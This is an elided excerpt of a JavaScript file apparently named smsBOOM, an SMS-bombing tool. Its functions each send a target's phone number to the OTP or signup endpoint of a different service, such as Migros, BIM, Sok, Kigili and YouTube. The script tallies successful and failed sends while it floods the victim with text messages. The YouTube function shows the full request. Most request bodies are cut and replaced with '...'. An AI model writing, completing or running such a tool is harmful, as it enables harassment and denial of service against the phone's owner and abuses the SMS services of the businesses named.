...
async function smsBOOM(numara, miktar) {
    ...
    function kigili(no) {
        request.post({
            ...
            if (httpResponse?.statusCode == 200) {
                ...
                dataFSms.hatali++;
                console.log(`[-] Kigili - ${no} - ${dataFSms.hatali}`.green);
            }
    ...
    function kahvedunyasi(no) {
        request.post({
            ...
            if (httpResponse?.statusCode == 200) {
                ...
                dataFSms.hatali++;
                console.log(`[-] Kahve Dunyasi - ${no} - ${dataFSms.hatali}`.green);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    ...
    function naosstars(no) {
        request.post({
            ...
            if (httpResponse?.statusCode == 200) {
                ...
                dataFSms.hatali++;
                console.log(`[-] Naosstars - ${no} - ${dataFSms.hatali}`.green);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    ...
    function wmf(no) {
        request.post({
            ...
            if (httpResponse?.statusCode == 200) {
                ...
                dataFSms.hatali++;
                console.log(`[-] WMF - ${no} - ${dataFSms.hatali}`.green);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    ...
    function bim(no) {
        request.post({
            ...
            if (httpResponse?.statusCode == 200) {
                ...
                dataFSms.hatali++;
                console.log(`[-] Bim - ${no} - ${dataFSms.hatali}`.green);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    ...
    function sok(no) {
        request.post({
            ...
            if (httpResponse?.statusCode == 200) {
                ...
                dataFSms.hatali++;
                console.log(`[-] Sok - ${no} - ${dataFSms.hatali}`.green);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    ...
    function migros(no) {
        request.post({
            ...
            if (httpResponse?.statusCode == 200) {
                ...
                dataFSms.hatali++;
                console.log(`[-] Migros - ${no} - ${dataFSms.hatali}`.green);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    ...
    function youtube(no) {
        request.post({
            url: 'https://www.youtube.com:443/user/otp-login/',
            json: {
                "phone": "0"+no,
                "next": "/youtube.com"
            }
            ...
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Youtube - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Youtube - ${no} - ${dataFSms.hatali}`.green);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    ...
    function englishhome(no) {
        request.post({
            ...
            if (httpResponse?.statusCode == 200) {
                ...
                dataFSms.hatali++;
                console.log(`[-] Englishhome - ${no} - ${dataFSms.hatali}`.green);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    ...
    function sakasu(no) {
        request.post({
            ...
            if (httpResponse?.statusCode == 200) {
                ...
                dataFSms.hatali++;
                console.log(`[-] Sakasu - ${no} - ${dataFSms.hatali}`.green);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
